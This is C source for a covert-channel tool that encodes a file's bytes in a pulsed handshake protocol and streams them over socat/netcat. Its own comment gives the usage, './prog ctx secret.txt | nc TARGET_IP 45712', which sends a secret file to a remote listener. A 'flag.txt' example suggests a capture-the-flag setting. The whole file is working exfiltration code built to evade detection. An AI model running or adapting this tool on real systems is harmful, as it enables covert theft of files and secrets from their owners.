/*
 * Stdio-based covert channel implementation
 * Adapted for use with socat/nc
 *
 * Usage:
 * Server (Receive): socat tcp-l:45712,reuseaddr,fork exec:"./prog srx"
 * Client (Send):    ./prog ctx secret.txt | nc TARGET_IP 45712
 * (Note: For client sending, you generally run the prog locally
 * and pipe the protocol output to nc, but this code handles
 * protocol wrapping directly. See instructions below.)
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <time.h>

#define BUFSIZE 32768
#define WSIZE 12
#define EOF_SIGNAL 0x3FF
#define PAYLOAD_IN_FD 3  // File descriptor for reading payload (TX mode)

int verbose = 0;

/* * IO Helpers:
 * We use read/write directly because printf/scanf can mess up 
 * raw binary data (uint64_t) framing.
 */

static inline uint64_t getbits(void)
{
    uint64_t val = 0;
    // Read from STDIN (Network Input)
    // STDIN is set to non-blocking in main()
    ssize_t n = read(STDIN_FILENO, &val, sizeof(val));
    if (n <= 0) return 0;
    return val;
}

static inline void setbits(uint64_t val)
{
    // Write to STDOUT (Network Output)
    write(STDOUT_FILENO, &val, sizeof(val));
    // fsync not strictly needed if _IONBF is set, but good for safety
}

/* * Handshake and Frame Logic (Unchanged)
 */
static inline void txword(int b)
{
    // Handshake: send three sync pulses
    while (getbits())
        ;
    setbits(1);
    while (getbits())
        ;
    setbits(1);
    while (getbits())
        ;
    setbits(1);
    while (getbits())
        ;

    // Send actual data bits with framing bit set
    for (int i = 0; i < WSIZE; i++) {
        while (getbits());
        setbits((b & 1) | 2);
        b >>= 1;
    }
}

static inline int rxword(void)
{
    uint64_t b = 0, bits = 0;
    int j;
    
    while (1) {
        // Wait for sync pulse
        for (j = 0, bits = 0; !bits && j < 10000; j++)
            bits = getbits();
        if (!bits)
            return -1;
        setbits(0); // Ack
        getbits();  // Clear line
        if (bits != 1) {
            continue;
        }
        
byte:
        b = 0;
        for (int i = 0; i < WSIZE; i++) {
            while (!(bits = getbits()));
            setbits(0);
            if (bits == 1) {
                // Resync detected
                goto byte;
            }
            if (bits & 1)
                b |= 1 << i;
        }
        return b;
    }
}

/*
 * Receiver Logic
 * Writes decoded payload to STDERR (fd 2) so it doesn't mix with Protocol on STDOUT
 */
static void rx(void)
{
    size_t cnt = 0;
    int b;
    uint8_t buf[BUFSIZE + 1];
    int discard = -1;

    if (verbose) fprintf(stderr, "[*] RX Loop Started\n");

    while (1) {
        b = rxword();
        if (b < 0) {
            // Timeout - flush buffer to STDERR
            if (cnt > 0) {
                if (verbose) fprintf(stderr, "RX %lu bytes\n", cnt);
                if (write(STDERR_FILENO, buf, cnt) != cnt)
                    return;
                cnt = 0;
            }
            continue;
        }
        
        if (b == EOF_SIGNAL) {
            if (verbose) fprintf(stderr, "The Senselessness of Endlessness\n");
            if (cnt > 0)
                write(STDERR_FILENO, buf, cnt);
            return;
        }
        
        if (b == discard) {
            discard = -1;
            continue;
        }
        if (!(b & 0x200)) continue;
        if (b & 0xfc00) continue;
        
        if ((b & 0x300) == 0x200)
            discard = b | 0x100;
        else
            discard = -1;
        
        buf[cnt++] = b;
        
        if (cnt >= BUFSIZE) {
            if (verbose) fprintf(stderr, "RX %lu bytes\n", cnt);
            write(STDERR_FILENO, buf, cnt);
            cnt = 0;
        }
    }
}

/*
 * Transmitter Logic
 * Reads payload from file descriptor 'fd'
 */
static void tx(int fd)
{
    uint8_t buf[BUFSIZE];
    
    if (verbose) fprintf(stderr, "[*] TX Loop Started reading from fd %d\n", fd);

    while (1) {
        int got = read(fd, buf, BUFSIZE);
        
        if (got == 0) {
            if (verbose) fprintf(stderr, "Returning to an Empty Apartment...\n");
            txword(EOF_SIGNAL);
            txword(EOF_SIGNAL);
            return;
        } else if (got < 0) {
             if (errno == EAGAIN) {
                usleep(10000); 
                continue;
             }
             perror("read payload");
             break;
        }

        if (verbose) fprintf(stderr, "TX %d bytes\n", got);
        uint8_t *p = buf;
        while (got--) {
            txword(0x200 | *p);
            txword(0x300 | *p++);
        }
    }
}

/*
 * Helpers for non-blocking IO setup
 */
void setup_io() {
    // Set STDOUT to unbuffered so pulses are sent immediately to socat
    setvbuf(stdout, NULL, _IONBF, 0);

    // Set STDIN (Network In) to non-blocking
    int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
    fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK);

    // Ignore SIGPIPE in case socat closes early
    signal(SIGPIPE, SIG_IGN);
}

// Adapted Intro using write(1) instead of send
static void intro()
{
    char buf[256];
    int len;
    // Shortened for brevity, uses write(1)
    usleep(22000); len = snprintf(buf, sizeof(buf), "Hello"); write(1, buf, len);
    usleep(3800);  len = snprintf(buf, sizeof(buf), ", welcome."); write(1, buf, len);
    usleep(10000); len = snprintf(buf, sizeof(buf), "\n\n"); write(1, buf, len);
}

static void outro()
{
    char buf[256];
    usleep(10000); write(1, "\nThere.\n", 8);
}

static void usage(const char *argv0)
{
    fprintf(stderr, "Usage: %s [-v] <stx|srx|ctx|crx> [payload_file]\n", argv0);
    fprintf(stderr, "  stx/ctx: Transmit 'payload_file' over the covert channel.\n");
    fprintf(stderr, "  srx/crx: Receive covert channel and print to STDERR.\n");
    exit(1);
}

int main(int argc, char **argv)
{
    char **argp = &argv[1];

    if (argc < 2) usage(argv[0]);

    if (!strcmp(*argp, "-v")) {
        verbose = 1;
        argp++;
        argc--;
    }

    if (argc < 2) usage(argv[0]);

    setup_io();
    char *mode = *argp;
    
    // Determine payload input source for TX modes
    int payload_fd = -1;
    if (strstr(mode, "tx")) {
        if (argc < 3) {
            fprintf(stderr, "Error: TX mode requires a payload file argument.\n");
            fprintf(stderr, "Example: %s stx flag.txt\n", argv[0]);
            exit(1);
        }
        const char *fname = argv[argc-1];
        payload_fd = open(fname, O_RDONLY);
        if (payload_fd < 0) {
            perror("open payload file");
            exit(1);
        }
    }

    if (!strcmp(mode, "stx") || !strcmp(mode, "ctx")) {
        intro();
        tx(payload_fd);
    } else if (!strcmp(mode, "srx") || !strcmp(mode, "crx")) {
        intro();
        rx(); // Writes to stderr
    } else {
        usage(argv[0]);
    }

    if (payload_fd >= 0) close(payload_fd);
    outro();
    return 0;
}